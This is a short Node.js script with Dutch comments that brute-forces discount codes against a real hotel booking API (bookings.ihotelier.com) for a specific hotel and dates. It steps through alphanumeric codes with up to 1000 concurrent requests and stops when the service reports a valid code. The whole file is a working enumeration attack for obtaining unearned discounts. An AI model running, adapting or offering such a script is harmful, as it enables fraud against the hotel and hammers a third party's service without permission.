#!/usr/bin/env node

var httpreq = require('httpreq');


var threads = 0;
var maxthreads = 1000;
var stop = false;

var code = "O9F4";

function loop(){

	if(stop) return;

	while(threads < maxthreads){
		code = getNextCode(code);

		threads++;

		tryCode(code, function (err, success){
			if (err) return console.log(err);

			threads--;

			if(success)
				stop = true;
			else
				loop();
		});
	}

}

loop();

function tryCode(code, callback){
	// console.log("Trying: " + code);

	httpreq.get('https://bookings.ihotelier.com/api/discount_info', {
		parameters:{
			hotelId: 3549,
			checkIn: '2013-09-30',
			checkOut: '2013-10-05',
			languageID: 1,
			discountCode: code
		}
	}, function (err, res){
		if(err) return callback(err);

		console.log(res);

		var data = JSON.parse(res.body);

		console.log("Last tried code: " + code);

		// console.log(data);

		if(data.Success != 'false'){
			console.log("Found valid code: " + code);
			callback(null, true);
		}else{
			callback(null, false);
		}
	});

}


function getNextCode(code){
	if(!code){
		code = '0';
	}

	var nextOnePlus1 = false;
	var newCh, ch, charcode, i;
	var newCode = '';

	for(i = 0; i< code.length; i++){
		ch = code.charAt(i);

		if(i>0 && nextOnePlus1==false){
			newCode = newCode + ch;
			continue; //loop overslaan
		}

		// we gaan 1 bijtellen:
		nextOnePlus1 = false;
		if(isNaN(parseInt(ch))){
			// tis een letter:
			newCh = ch.charCodeAt(0);
			newCh++;
			if(newCh > 90){
				//groter dan Z
				// 91 ==> 0
				// 92 ==> 1
				// ...
				newCh = newCh - 91;
				nextOnePlus1 = true; // 1 overdragen naar volgende
			}else{
				newCh = String.fromCharCode(newCh);
			}
		}else{
			// tis een cijfer:
			newCh = parseInt(ch);
			newCh++;
			if(newCh > 9){
				// 10 => 65
				// 11 => 66
				newCh = String.fromCharCode(newCh + 55); // 10 wordt A, 11 wordt B, enz...
			}else{
				newCh = '' + newCh; // terug string van maken
			}
		}


		newCode = newCode + newCh;

	}

	// als er geen next one was:
	if(nextOnePlus1){
		newCode = newCode + '0';
	}

	return newCode;
}






// tryCode()